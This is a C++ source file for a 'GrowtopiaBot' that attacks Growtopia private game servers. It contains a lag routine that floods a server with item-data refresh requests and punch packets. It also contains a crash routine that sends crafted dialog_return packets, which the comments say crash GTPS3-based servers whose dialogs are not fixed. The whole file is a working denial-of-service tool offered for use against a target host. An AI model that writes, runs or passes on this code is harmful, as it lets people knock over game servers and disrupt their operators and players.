#pragma once
#include <sstream>
#include <vector>
#include <limits>
#include <math.h>
#include <string>
#include <iostream>
#include <regex>
#include <iterator>
#include <algorithm>

#include "corefunc.h"
#include "userfunc.h"
#include "enet/enet.h"

using namespace std;

void GrowtopiaBot::WhenConnected()
{
	/*
		* Checking if bot connected or not.
    */
	connected = true;
}

void GrowtopiaBot::WhenDisconnected()
{
	/*
		* Auto connect to client when bot disconnect (looping connection).
	*/
	connected = false;
	connectClient();
}

#include <chrono>
using namespace std::chrono;

void GrowtopiaBot::userLoop() {
	gameupdatepacket_t packet;
	packet.m_type = PACKET_TILE_CHANGE_REQUEST;
	packet.m_int_data = 18;

	if (lastreq + 750 < (duration_cast<milliseconds>(system_clock::now().time_since_epoch())).count()) {
		lastreq = (duration_cast<milliseconds>(system_clock::now().time_since_epoch())).count();
		
		for (int i = 0; i < 50; i++) {
			if (!connected) return;
			if (SERVER_LAG == true) {

				SendPacket(2, "action|refresh_item_data\n", peer);

				/*
				* action|refresh_item_data\n  spamming is supper effective for gtps servers. It will spam (3.347kb) items.dat file.
				* enet_peer_send(peer, 0, enet_packet_create(item_data, item_data_size + 60, ENET_PACKET_FLAG_RELIABLE));
				*/



				int x = i % 100, y = i / 100;
				packet.m_state1 = x;
				packet.m_state2 = y;
				SendPacket2(NET_MESSAGE_GAME_PACKET, (uint8_t*)&packet, sizeof(gameupdatepacket_t));

				/*
				* gameupdatepacket_t Punch Spamming is effective but not that much.
				* it will damage low memory to server.
				*/

				cout << "Sent LAG PACKET to " + to_string(SERVER_PORT) + " Port of " + SERVER_HOST + " ip!" << endl;
			}
			if (SERVER_CRASH == true) {
				SendPacket(2, "action|dialog_return\ndialog_name|blast\nitemID|831", peer);
				SendPacket(2, "action|dialog_return\ndialog_name|find_item_dialog", peer);
				SendPacket(2, "action|dialog_return\ndialog_name|item_search", peer);
				SendPacket(2, "action|dialog_return\ndialog_name|change_guild_name\nbuttonClicked|confirm", peer);
				SendPacket(2, "action|dialog_return\ndialog_name|statsblockworld\nbuttonClicked|search_", peer);

				/*
				* These crash methods found by me @batutekoz77 (github).
				* These methods will work on GTPS3 base Sources (if not dialogs fully fixed).
				*/

				cout << "Sent CRASH PACKET to " + to_string(SERVER_PORT) + " Port of " + SERVER_HOST + " ip!" << endl;
			}
		}
	}
	return;
}

void GrowtopiaBot::userInit() {
	connectClient();
	/*
		   * Connectiong bot to client.
	*/
}
